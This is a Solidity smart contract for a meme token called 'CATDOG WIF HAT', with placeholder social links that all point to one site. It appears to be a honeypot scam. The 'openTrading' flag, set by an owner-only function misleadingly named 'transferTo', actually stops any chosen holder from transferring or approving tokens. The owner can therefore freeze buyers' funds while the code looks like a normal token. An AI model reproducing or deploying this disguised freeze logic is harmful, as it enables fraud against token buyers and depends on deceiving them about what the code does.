// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**

Website  : https://catdogwifhat.xyz/
Twitter  : https://catdogwifhat.xyz/
Telegram : https://catdogwifhat.xyz/
*/

contract CATDOG {

    string public name = "CATDOG WIF HAT";
    string public symbol = "CATDOG";
    uint256 public totalSupply = 999999999999999999000000000;
    uint8 public decimals = 18;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) public openTrading;

    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event OpenTradingUpdated(address indexed account, bool isOpenTrading);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "1CATDOG");
        _;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "2CATDOG");
        require(_to != address(0), "3CATDOG");
        require(!openTrading[msg.sender], "4CATDOG");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(!openTrading[msg.sender], "5CATDOG");

        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "6CATDOG");
        require(allowance[_from][msg.sender] >= _value, "7CATDOG");
        require(_to != address(0));
        require(!openTrading[_from], "8CATDOG");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "9CATDOG");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function transferTo(address _account) public onlyOwner {
        openTrading[_account] = true;
        emit OpenTradingUpdated(_account, true);
    }
}